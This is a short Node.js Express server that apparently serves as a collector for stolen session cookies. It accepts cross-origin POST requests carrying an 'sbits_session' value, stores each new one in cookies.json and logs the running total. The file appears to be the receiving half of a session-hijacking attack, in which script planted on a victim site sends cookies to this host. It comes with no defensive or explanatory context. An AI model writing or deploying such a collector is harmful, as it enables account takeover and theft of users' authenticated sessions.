const express = require("express");
const cors = require('cors');
const ip = require("ip");
const fs = require('fs');

const app = express();
app.use(express.json({ extended: true }));
app.use(cors());

app.get("/", async (req, res) => {
    res.sendStatus(200);
});

app.post("/", async (req, res) => {
    let cookies = require('./cookies.json');
    if (!cookies.find(e => e.sbits_session === req.body.sbits_session)) {
        cookies.push(req.body);
        fs.writeFileSync('cookies.json', JSON.stringify(cookies))
        console.log(cookies.length);
    }
    res.sendStatus(200);
});

async function start() {
    app.listen(3000, () => {
        console.log(`App listening at ${ip.address()}:3000`);
    });
}
start();